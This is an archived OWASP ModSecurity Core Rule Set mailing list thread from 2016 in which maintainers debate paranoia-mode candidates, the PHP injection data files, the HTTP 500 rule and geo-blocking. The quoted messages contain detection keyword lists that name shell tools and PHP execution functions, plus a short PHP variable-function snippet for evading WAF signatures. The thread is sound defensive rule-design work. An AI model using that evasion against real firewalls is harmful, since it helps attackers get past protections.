>>
>> I see. Good observations.
>>
>> > 1) I think that a user should check their desired platforms in the
>>setup conf. In fact, this would be great to do anyway in the initial
>>3.0.0 release even if we DON'T look at it in any rule yet. Specifying
>>platform types will pave the way for reducing false positives and false
>>negatives by skipping unnecessary checks and being more strict on the
>>right platforms. So we could start by listing these platforms in the
>>existing rule in the setup conf. Example:
>> >
>> >    SecAction \
>> >      "id:'900024', \
>> >      phase:1, \
>> >      t:none, \
>> >      setvar:tx.unix=1, \
>> >      setvar:tx.windows=1, \
>> >      setvar:tx.java=1, \
>> >      setvar:tx.php=1, \
>>
>> That makes a lot of sense. At first sight.
>>
>> I think that a default install should come with these rulesets
>> all enabled and a sysadmin can then switch them of if we is aware that
>> there is no php in his service.
>>
>> So given the following two scenarios
>> #1 - Newbie sysadmin installs ModSec and runs into a lot of false
>>positives
>>     because he does not disable unneeded rulesets
>> #2 - Newbie sysadmin installs ModSec and is p0wned because he does not
>>enable
>>     the php protection
>> I strongly favour #1.
>>
>> A vanilla install of the core rules should give you a full coverage for
>>all
>> types of services and a decent security level. Reducing false positives
>>by
>> omitting certain rules (ideally rules which provide no value for your
>>setup)
>> is the very idea of tuning.
>> Reducing the initial number of false positives by moving certain rules
>> with a worse relationsship between added security and false positives,
>> that is the idea of the paranoia mode.
>>
>> Chaim stated in a different message, that the rules are now organised
>> into files aimed at certain environments. So switching them off is
>> fairly easy. And there are the tags on top of it.
>> So you have tag:'language-PHP' and setting SecRuleRemoveByTag will
>> disable them all very easily.
>>
>> So I think, we do not need these variables.
>>
>> > (By the way: I think it?s unfortunate that a user has to use value 1
>>to enable a check. An undefined variable will mean that the CRS will
>>skip some rules. This makes it dangerous to introduce a new variable in
>>the CRS later; all existing installations MUST then add this variable to
>>their setup rule immediately, or suffer from reduced security. It?s
>>better to use a scheme that defaults to ?on?. A convention like
>>?tx.disable_mysql=1? would be user unfriendly and error-prone. But we
>>could check for an explicit ?off? string, e.g. ?setvar:tx.mysql=off?. If
>>it?s not ?off? then assume that the user DOES want the check. I think
>>it?s important to get this right in 3.0.0, it will be more painful to do
>>it later.)
>>
>> That's a very good observation. I had a similar idea once.
>>
>> In programming, you usually start with a default value and then
>> the users overrides the default value. If he wants to.
>>
>> I am not sure how modsecurity_crs_10_setup.conf.example is going to
>> be transformed to work seamlessly with 3.0. But this makes the
>> setting of default values a bit tricky.
>>
>> Maybe a file REQUEST-02-DEFAULTS.conf could set default values
>> if certain variables are not set.
>>
>> > 2) Separate the words into multiple lists:
>> >    os-commands-critical.data (absolute red flag list: "curl", "passwd",
>>"sh", "uname", "wget" etc.)
>> >    os-commands-paranoid.data (absolute low value, but high FP natural
>>words like "choice")
>> >    os-commands-windows.data (all Windows commands)
>> >    os-commands-common.data (all other commands)
>>
>> Makes some sense. Too granular is difficult and you mix various
>> grouping criteria (criticality, paranoia, os), which makes is a
>> bit hard to follow.
>>
>> Other opinions?
>>
>> > 3) Review the current regexp against some test data and CRSv2 to make
>>it more sensitive
>>
>> Good plan. Maybe this could be done in a separate pull request.
>> I am afraid to overload the paranoia mode pull request...
>>
>> Ahoj,
>>
>> Christian
>>
>>
>> --
>> In war you will generally find that the enemy has at any time
>> three courses of action open to him. Of those three, he will
>> invariably choose the fourth.
>> -- Helmuth Von Moltke
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>
>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOIn
>>uYrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set
>
>--
>mailto:christian.folini at netnea.com
>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOInu
>N-aaCptw&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>twitter: @ChrFolini
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOInu
>YrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>asp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 15 04:13:32 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 15 Feb 2016 04:13:32 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 958977 / 933110 and 958979 / 933120 (PHP Injection Attacks)
In-Reply-To: <20160212211922.GC32631@elias>
References: <20160202082502.GC29931@elias>
	<54703590-4F48-4A1B-9271-E1E29A45FE39@spam.lifeforms.nl>
	<D2DCD071.1752C%csanders@trustwave.com> <20160207201206.GD30297@elias>
	<20160212211922.GC32631@elias>
Message-ID: <D2E6B998.1A46B%csanders@trustwave.com>

It seems like this falls under the PHP work that will need to be done
prior to RC1 - I do agree it hasn?t been settled yet and since we?re gonna
be messing with it - we should most certainly come to a conclusion. I am
finding it hard to isolate the main points but my understanding is that we
want to add:
1) A parameter to indicate if PHP is in use in the config
2) Possible 1 additional data file with ?paranoid? versus regular PHP
function names
3) to work with the issue of PHP bypasses - more on this in the more
detailed email.

While I encourage the addition of other PHP function names this can be
done right now we don?t need a specific task for it for RC1 (but we should
add a general task to update it. Perhaps @christian what do you think of
making a task for it and assigning it to me.

On 2/12/16, 4:19 PM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
on behalf of christian.folini at netnea.com> wrote:

>And another one.
>
>This conversation is also not settled. Please help us to come
>to a conclusion.
>
>The biggest issue is the question of the granularity of the
>data files.
>
>Ahoj,
>
>Christian
>
>On Sun, Feb 07, 2016 at 09:12:06PM +0100, Christian Folini wrote:
>> Hello,
>>
>> Your ideas are extremely valuable Walter. And even if I do not agree
>> with your solutions to the letter, I love the fact that we are having
>> technical discussions on the merit of individual rules.
>>
>> Chaim seems to be on the same page with me on the idea of
>> environment-specific rules and how to handle the enabling / disabling.
>>
>> And then the problem of the granularity of the files. There is a
>> danger in overengineering things and making the configuration / tuning
>> too complex. In that light, I think splitting makes sense, but
>> ideally, we end up with
>>
>> xxx-standard.data
>> xxx-paranoia.data
>>
>> However, you have a point that you can not alter the contents of these
>> data files afterwards in a local setup in a safe way. So disabling
>>Windows
>> commands won't work unless we add specific data files with their own
>> rules, which can then be disabled.
>>
>> I am really torn here.
>>
>> In my stated fear of overloading the paranoia project / pull request,
>> I would appreciate to handle the big updates to individual rules
>> in separate pull requests - if possible. If it has to be, we include it.
>>
>> Ahoj,
>>
>> Christian
>>
>>
>> On Sun, Feb 07, 2016 at 03:46:32PM +0000, Chaim Sanders wrote:
>> > I like the ideas. The first thing I?d note is that individuals are
>>free to
>> > exclude or remove entire files so as long as the PHP file is named
>> > REQUEST-XYZ-PHP-XYZ people running ASP should get this hint
>>(hopefully)
>> > this is why we name them in this way. In terms of splitting the
>>files, I
>> > most certainly agree with the ?critical?. Again I caution against
>> > splitting data files TOO finely as it will get confusing to support
>>your
>> > own instance but this is just a minor issue. As for those
>>parenthesis. You
>> > are right and this is actually my fault. I added them to prevent false
>> > positives being reported commonly on Cpanel.
>> >
>> > On 2/7/16, 8:58 AM,
>> > "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>> > Walter Hop" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>>on
>> > behalf of modsec at spam.lifeforms.nl> wrote:
>> >
>> > >On 02 Feb 2016, at 09:25, Christian Folini
>><christian.folini at netnea.com>
>> > >wrote:
>> > >>
>> > >> Like the previous post on 950907 / 932100, this is controversial
>>because
>> > >> of possible false positives due to a data file with strings:
>> > >>
>> >
>>>>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AA
>>>>Pk
>> >
>>>>vSmewhU_w&s=5&u=https%3a%2f%2fraw%2egithubusercontent%2ecom%2fSpiderLab
>>>>s%
>> >
>>>>2fowasp-modsecurity-crs%2fv3%2e0%2e0-rc1%2frules%2fphp-function-names%2
>>>>ed
>> > >>ata
>> > >>
>> >
>>>>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AA
>>>>Pk
>> >
>>>>qKjKQ1VqQ&s=5&u=https%3a%2f%2fraw%2egithubusercontent%2ecom%2fSpiderLab
>>>>s%
>> >
>>>>2fowasp-modsecurity-crs%2fv3%2e0%2e0-rc1%2frules%2fphp-config-directive
>>>>s%
>> > >>2edata
>> > >>
>> > >> Could these files be split in the manner explained in the message
>> > >> before?
>> > >>
>> > >> After all, this rule scans input against strings like
>> > >> dl, eval, exec, from, precision.
>> > >
>> > >I would advocate the same separation as in my previous post re
>> > >os-commands.
>> > >But we need a little more firepower for PHP in my opinion.
>> > >A detailed approach could go like this...
>> > >
>> > >1) Have the user indicate with setvar if they want to protect PHP,
>>and
>> > >predicate the rules on that. All the non PHP shops will be solved
>>from FP
>> > >instantly!
>> > >
>> > >2) We need to review the current data file:
>> > >- I?m missing some stuff there that I see in the wild every day such
>>as:
>> > >gzinflate, gzdecode, gzuncompress, strrev, zlib_decode?
>> > >- I also see in some cases the parenthesis is added, like: /file(/
>>and
>> > >/assert(/. This seems easy to evade. In PHP, calling ?assert
>>($foo)?
>> > >or ?assert\t\t\t($foo)? is just as valid. In this case, it was
>>probably
>> > >done because those terms lead to FP. If so, we might move super
>>common
>> > >terms with relatively low attacker interest, like assert, to the
>>paranoid
>> > >list. But, in any case they should become more robust regexps like
>> > >?\bfile\s*(?.
>> > >
>> > >3) Separate the data file. Start with a small
>> > >?php-commands-critical.data? list. This should contain the usual
>>suspects
>> > >used for:
>> > >- obfuscation: base64_decode, gzdecode, etc...
>> > >- execution: passthru, proc_open, shell_exec, call_user_func,
>> > >require_once, include_once...
>> > >- IO: file_get_contents, file_put_contents, fopen, fwrite...
>> > >- environment inspection and setting: error_reporting,
>>function_exists,
>> > >ini_set, auto_prepend_file, sys_get_temp_dir...
>> > >
>> > >If any of those strings is present, it?s certainly an attack, except
>>for
>> > >that single person who runs a PHP-related wiki. The list should only
>> > >contain the real red flags, don?t try to cleverly prevent FP using
>> > >complex regexps, and cannot contain any common English words (so
>> > >unfortunately ?require? and ?include? are off limits...)
>> > >
>> > >4) Other functions could go in ?php-commands-functions.data?. This
>>list
>> > >would be small and contain only *proper functions* having PHP syntax
>> > >?function()? and have names often used in natural text. To prevent
>>FP we
>> > >look for the parenthesis. Let?s take example ?system?, this is often
>> > >found in natural text, but an attacker wants to do ?system(? so they
>>need
>> > >parentheses and a word boundary at the start. So a regexp might look
>>like
>> > >"\bsystem\s*\(?. Because we have the regexp, FP is lowered. It would
>> > >still match stuff like ?F*ck the system (yeah yeah)?
>> > >
>> > >5) Other PHP related terms could stay in ?php-commands-common.data?.
>>This
>> > >would list the PHP commands and terms of lesser interest.
>> > >
>> > >6) We?ll have to review if there are terms which are so common in
>>natural
>> > >text that they?ll have to be moved to ?php-commands-paranoid.data?. I
>> > >think this list might be as small as possible. Maybe stuff like ?dl?,
>> > >?require?, ?include?. It?s still likely to produce FP...
>> > >
>> > >7) String matching for PHP functions is not powerful enough. We need
>> > >generic rules that prevent PHP evasion. I don?t remember seeing this
>>in
>> > >the wild, but an easy way to evade textual signature matches would
>>be PHP
>> > >variable functions
>> >
>>>(http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AA
>>>Pk
>> >
>>>vCjeQMDpQ&s=5&u=http%3a%2f%2fphp%2enet%2fmanual%2fen%2ffunctions%2evaria
>>>bl
>> > >e-functions%2ephp%29 For instance, you can do the following to get
>>around
>> > >the CRS:
>> > >
>> > >$aB_4c = 'fil' . 'e_get' . '_contents';
>> > >$aB_4c('...');
>> > >
>> > >So we want a generic signature to detect variable function call
>>syntax.
>> > >Fortunately its syntax is very uncommon in natural text, so I?d
>>advocate
>> > >putting this rule in normal mode.
>> > >
>> > >Anyway my ?0.02 or maybe a bit more :)
>> > >
>> > >
>> > >_______________________________________________
>> > >Owasp-modsecurity-core-rule-set mailing list
>> > >Owasp-modsecurity-core-rule-set at lists.owasp.org
>> >
>>>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAP
>>>kq
>> >
>>>emcgoEpA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>>ow
>> > >asp-modsecurity-core-rule-set
>> >
>> >
>> > ________________________________
>> >
>> > This transmission may contain information that is privileged,
>>confidential, and/or exempt from disclosure under applicable law. If you
>>are not the intended recipient, you are hereby notified that any
>>disclosure, copying, distribution, or use of the information contained
>>herein (including any reliance thereon) is strictly prohibited. If you
>>received this transmission in error, please immediately contact the
>>sender and destroy the material in its entirety, whether in electronic
>>or hard copy format.
>> > _______________________________________________
>> > Owasp-modsecurity-core-rule-set mailing list
>> > Owasp-modsecurity-core-rule-set at lists.owasp.org
>> >
>>http://scanmail.trustwave.com/?c=4062&d=zdK-1lANbYH0zbTgGyqCcBKbND23Kjo7G
>>5xS4hMPhQ&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set
>>
>> --
>> mailto:christian.folini at netnea.com
>>
>>http://scanmail.trustwave.com/?c=4062&d=zdK-1lANbYH0zbTgGyqCcBKbND23Kjo7G
>>5kHvhVUiA&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>> twitter: @ChrFolini
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>
>>http://scanmail.trustwave.com/?c=4062&d=zdK-1lANbYH0zbTgGyqCcBKbND23Kjo7G
>>5xS4hMPhQ&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set
>
>--
>mailto:christian.folini at netnea.com
>http://scanmail.trustwave.com/?c=4062&d=zdK-1lANbYH0zbTgGyqCcBKbND23Kjo7G5
>kHvhVUiA&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>twitter: @ChrFolini
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>http://scanmail.trustwave.com/?c=4062&d=zdK-1lANbYH0zbTgGyqCcBKbND23Kjo7G5
>xS4hMPhQ&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>asp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 15 04:16:51 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 15 Feb 2016 04:16:51 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 970901 / 950100 (Application returning 500)
In-Reply-To: <20160212212239.GD32631@elias>
References: <20160202084457.GE29931@elias> <20160212212239.GD32631@elias>
Message-ID: <D2E6BB0B.1A475%csanders@trustwave.com>

Honestly I am fine either way. It isn?t really a ?paranoid? issue it is
more of an issue with modsecurity understanding. Perhaps another reason
why paranoid is a bad name :-p. I do think based on this convo that moving
it to paranoid doesn?t hurt.

On 2/12/16, 4:22 PM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
on behalf of christian.folini at netnea.com> wrote:

>Hello,
>
>There has not been much of a discussion here. Thinking this over once or
>twice again, I think the idea of the paranoia mode is to make things
>easier for the inexperienced admin.
>
>In this light, I think it is best to move this rule to paranoia mode.
>This will allow for easier blind sqli attacks, but it does not cloak
>a backend error with a 403.
>
>Unless somebody objects with new arguments of course. If you do object,
>please move quickly now.
>
>Best,
>
>Christian
>
>
>
>On Tue, Feb 02, 2016 at 09:44:57AM +0100, Christian Folini wrote:
>> Hi!
>>
>> This is a juicy one.
>>
>> Rule in 2.2.9:
>> SecRule RESPONSE_STATUS "^5\d{2}$"
>>"phase:4,rev:'2',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'9',t:none,c
>>apture,ctl:auditLogParts=+E,block,msg:'The application is not
>>available',logdata:'Matched Data: %{TX.0} found within
>>%{MATCHED_VAR_NAME}:
>>%{MATCHED_VAR}',id:'970901',tag:'WASCTC/WASC-13',tag:'OWASP_TOP_10/A6',ta
>>g:'PCI/6.5.6',severity:'3',setvar:'tx.msg=%{rule.msg}',setvar:tx.outbound
>>_anomaly_score=+%{tx.error_anomaly_score},setvar:tx.anomaly_score=+%{tx.e
>>rror_anomaly_score},setvar:tx.%{rule.id}-AVAILABILITY/APP_NOT_AVAIL-%{mat
>>ched_var_name}=%{tx.0}"
>>
>> Rule in 3.0.0rc1:
>> SecRule RESPONSE_STATUS "^5\d{2}$" \
>>      "phase:response,\
>>      rev:'3',\
>>      ver:'OWASP_CRS/3.0.0',\
>>      maturity:'9',\
>>      accuracy:'9',\
>>      t:none,\
>>      capture,\
>>      ctl:auditLogParts=+E,\
>>      block,\
>>      msg:'The Application Returned a 500-Level Status Code',\
>>      logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}:
>>%{MATCHED_VAR}',\
>>      id:'950100',\
>>      tag:'application-multi',\
>>      tag:'language-multi',\
>>      tag:'platform-multi',\
>>      tag:'attack-information disclosure',\
>>      tag:'WASCTC/WASC-13',\
>>      tag:'OWASP_TOP_10/A6',\
>>      tag:'PCI/6.5.6',\
>>      severity:'ERROR',\
>>      setvar:'tx.msg=%{rule.msg}',\
>>      setvar:tx.outbound_anomaly_score=+%{tx.error_anomaly_score},\
>>      setvar:tx.anomaly_score=+%{tx.error_anomaly_score},\
>>
>>      setvar:tx.%{rule.id}-AVAILABILITY/APP_NOT_AVAIL-%{matched_var_name}=%{tx
>>.0}"
>>
>> Obviously we check the HTTP response status code and trigger an alert
>>on
>> a status 500. It is one of the rare rules with anomaly score error (=4)
>> as opposed to critical (=5).
>>
>> Franziska thinks this is too generic and cloaks backend misbehaviour.
>> (If you have a problem with the error page, then replace it!), but let's
>> not hide the fact of the error from the client.
>>
>> Now Walter thinks this rule plays a role when defending against blind
>> attacks where the difference between 403 (likely blocked by
>>ModSecurity)
>> and 500 (passed ModSecurity, but crashed on backend) gives an attacker
>> important information.
>>
>> Initially, I wanted to push this rule into paranoia mode. But now I am
>> not so sure anymore for Walter does have a point.
>>
>> However, the inexperienced administrator could have a hard time
>> indentifying the 403 status as a backend failure. So maybe it is still
>> a paranoia candidate despite it's supportive role when defending against
>> blind injection attacks.
>>
>> More brain cycles are definitely needed here!
>>
>> Christian
>>
>>
>> --
>> mailto:christian.folini at netnea.com
>>
>>http://scanmail.trustwave.com/?c=4062&d=gdO-1gRxIDHovuaeslSrBCHmlII0ZDH7c
>>U_5KX4pjQ&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>> twitter: @ChrFolini
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>
>>http://scanmail.trustwave.com/?c=4062&d=gdO-1gRxIDHovuaeslSrBCHmlII0ZDH7c
>>UqsdXhygA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set
>
>--
>mailto:christian.folini at netnea.com
>http://scanmail.trustwave.com/?c=4062&d=gdO-1gRxIDHovuaeslSrBCHmlII0ZDH7cU
>_5KX4pjQ&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>twitter: @ChrFolini
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>http://scanmail.trustwave.com/?c=4062&d=gdO-1gRxIDHovuaeslSrBCHmlII0ZDH7cU
>qsdXhygA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>asp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 15 04:19:44 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 15 Feb 2016 04:19:44 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk
 Country Location)
In-Reply-To: <20160213053026.GA9613@elias>
References: <20160213053026.GA9613@elias>
Message-ID: <D2E6BBB0.1A479%csanders@trustwave.com>

In general I like to assume that if people are going to get caught by
something blocking unintentionally it will be a configuration from the
configuration file, as they are supposed to be reading those :-). I
honestly haven?t heard many complaints about this feature and as a result
I?d probably leave it enabled as it as sad as it is, is fairly effective.

On 2/13/16, 12:30 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
on behalf of christian.folini at netnea.com> wrote:

>Hi there,
>
>It seems I overlooked this candidate, where Franziska said she is unsure
>whether we should blog certain countries in a default installation or
>not.
>
>The rule does:
>  SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}"
>
>With tx.high_risk_country_codes being set to
>"UA ID YU LT EG RO BG TR RU PK MY CN"
>in modsecurity_crs_10_setup.conf.example.
>
>Depending on your location, requests from the given set of
>countried may be desired and not potential attacks. So I think
>Franziska has a point.
>
>One resolution would be to leave the rule where it is, but comment
>out the definition of the variable in
>modsecurity_crs_10_setup.conf.example
>and provide multiple default variants in the comments.
>That could also be performed in combination with the move to
>the paranoia mode.
>
>Opinions?
>
>Christian
>
>
>--
>The problem is, if you're not a hacker,
>you can't tell who the good hackers are.
>--- Paul Graham
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i
>xlzEmHDg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>asp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From christian.folini at netnea.com  Mon Feb 15 20:08:57 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 15 Feb 2016 21:08:57 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 958977 / 933110 and 958979 / 933120 (PHP Injection Attacks)
In-Reply-To: <D2E6B998.1A46B%csanders@trustwave.com>
References: <20160202082502.GC29931@elias>
	<54703590-4F48-4A1B-9271-E1E29A45FE39@spam.lifeforms.nl>
	<D2DCD071.1752C%csanders@trustwave.com>
	<20160207201206.GD30297@elias> <20160212211922.GC32631@elias>
	<D2E6B998.1A46B%csanders@trustwave.com>
Message-ID: <20160215200857.GA4580@elias>

Chaim,

In the light of Walter's investigation into the deficiencies of the
PHP rules in 3.0.0rc1 and his plan to work on these a lot, I think
we can cut down the paranoia mode side-project by leaving
958977 / 933110 
and
958979 / 933120
aside and have you and Walter cover them.

(sidenote for the list: Walter got in touch with Chaim and me on the 
weekend. He plans to write a longer message to the list one of these 
days).

>From my point of view, the question on how to cut the monolithic data
files is really tricky. From the point of the paranoia mode it is a 
tangent issue, but it seems so difficult for me, that I would rather
drop these rules from the our project then risking further delay.

> 1) A parameter to indicate if PHP is in use in the config

Please don't. Unless it's on by default. 
I think the CRS should work out of the box and 
deliver full coverage out of the box. If PHP protection is off
by default, people will deploy ModSec without PHP protection and
won't even notice.

Cheers,

Christian




On Mon, Feb 15, 2016 at 04:13:32AM +0000, Chaim Sanders wrote:
> It seems like this falls under the PHP work that will need to be done
> prior to RC1 - I do agree it hasn?t been settled yet and since we?re gonna
> be messing with it - we should most certainly come to a conclusion. I am
> finding it hard to isolate the main points but my understanding is that we
> want to add:
> 1) A parameter to indicate if PHP is in use in the config
> 2) Possible 1 additional data file with ?paranoid? versus regular PHP
> function names
> 3) to work with the issue of PHP bypasses - more on this in the more
> detailed email.
> 
> While I encourage the addition of other PHP function names this can be
> done right now we don?t need a specific task for it for RC1 (but we should
> add a general task to update it. Perhaps @christian what do you think of
> making a task for it and assigning it to me.
> 
> On 2/12/16, 4:19 PM,
> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> on behalf of christian.folini at netnea.com> wrote:
> 
> >And another one.
> >
> >This conversation is also not settled. Please help us to come
> >to a conclusion.
> >
> >The biggest issue is the question of the granularity of the
> >data files.
> >
> >Ahoj,
> >
> >Christian
> >
> >On Sun, Feb 07, 2016 at 09:12:06PM +0100, Christian Folini wrote:
> >> Hello,
> >>
> >> Your ideas are extremely valuable Walter. And even if I do not agree
> >> with your solutions to the letter, I love the fact that we are having
> >> technical discussions on the merit of individual rules.
> >>
> >> Chaim seems to be on the same page with me on the idea of
> >> environment-specific rules and how to handle the enabling / disabling.
> >>
> >> And then the problem of the granularity of the files. There is a
> >> danger in overengineering things and making the configuration / tuning
> >> too complex. In that light, I think splitting makes sense, but
> >> ideally, we end up with
> >>
> >> xxx-standard.data
> >> xxx-paranoia.data
> >>
> >> However, you have a point that you can not alter the contents of these
> >> data files afterwards in a local setup in a safe way. So disabling
> >>Windows
> >> commands won't work unless we add specific data files with their own
> >> rules, which can then be disabled.
> >>
> >> I am really torn here.
> >>
> >> In my stated fear of overloading the paranoia project / pull request,
> >> I would appreciate to handle the big updates to individual rules
> >> in separate pull requests - if possible. If it has to be, we include it.
> >>
> >> Ahoj,
> >>
> >> Christian
> >>
> >>
> >> On Sun, Feb 07, 2016 at 03:46:32PM +0000, Chaim Sanders wrote:
> >> > I like the ideas. The first thing I?d note is that individuals are
> >>free to
> >> > exclude or remove entire files so as long as the PHP file is named
> >> > REQUEST-XYZ-PHP-XYZ people running ASP should get this hint
> >>(hopefully)
> >> > this is why we name them in this way. In terms of splitting the
> >>files, I
> >> > most certainly agree with the ?critical?. Again I caution against
> >> > splitting data files TOO finely as it will get confusing to support
> >>your
> >> > own instance but this is just a minor issue. As for those
> >>parenthesis. You
> >> > are right and this is actually my fault. I added them to prevent false
> >> > positives being reported commonly on Cpanel.
> >> >
> >> > On 2/7/16, 8:58 AM,
> >> > "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> >> > Walter Hop" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> >>on
> >> > behalf of modsec at spam.lifeforms.nl> wrote:
> >> >
> >> > >On 02 Feb 2016, at 09:25, Christian Folini
> >><christian.folini at netnea.com>
> >> > >wrote:
> >> > >>
> >> > >> Like the previous post on 950907 / 932100, this is controversial
> >>because
> >> > >> of possible false positives due to a data file with strings:
> >> > >>
> >> >
> >>>>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AA
> >>>>Pk
> >> >
> >>>>vSmewhU_w&s=5&u=https%3a%2f%2fraw%2egithubusercontent%2ecom%2fSpiderLab
> >>>>s%
> >> >
> >>>>2fowasp-modsecurity-crs%2fv3%2e0%2e0-rc1%2frules%2fphp-function-names%2
> >>>>ed
> >> > >>ata
> >> > >>
> >> >
> >>>>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AA
> >>>>Pk
> >> >
> >>>>qKjKQ1VqQ&s=5&u=https%3a%2f%2fraw%2egithubusercontent%2ecom%2fSpiderLab
> >>>>s%
> >> >
> >>>>2fowasp-modsecurity-crs%2fv3%2e0%2e0-rc1%2frules%2fphp-config-directive
> >>>>s%
> >> > >>2edata
> >> > >>
> >> > >> Could these files be split in the manner explained in the message
> >> > >> before?
> >> > >>
> >> > >> After all, this rule scans input against strings like
> >> > >> dl, eval, exec, from, precision.
> >> > >
> >> > >I would advocate the same separation as in my previous post re
> >> > >os-commands.
> >> > >But we need a little more firepower for PHP in my opinion.
> >> > >A detailed approach could go like this...
> >> > >
> >> > >1) Have the user indicate with setvar if they want to protect PHP,
> >>and
> >> > >predicate the rules on that. All the non PHP shops will be solved
> >>from FP
> >> > >instantly!
> >> > >
> >> > >2) We need to review the current data file:
> >> > >- I?m missing some stuff there that I see in the wild every day such
> >>as:
> >> > >gzinflate, gzdecode, gzuncompress, strrev, zlib_decode?
> >> > >- I also see in some cases the parenthesis is added, like: /file(/
> >>and
> >> > >/assert(/. This seems easy to evade. In PHP, calling ?assert
> >>($foo)?
> >> > >or ?assert\t\t\t($foo)? is just as valid. In this case, it was
> >>probably
> >> > >done because those terms lead to FP. If so, we might move super
> >>common
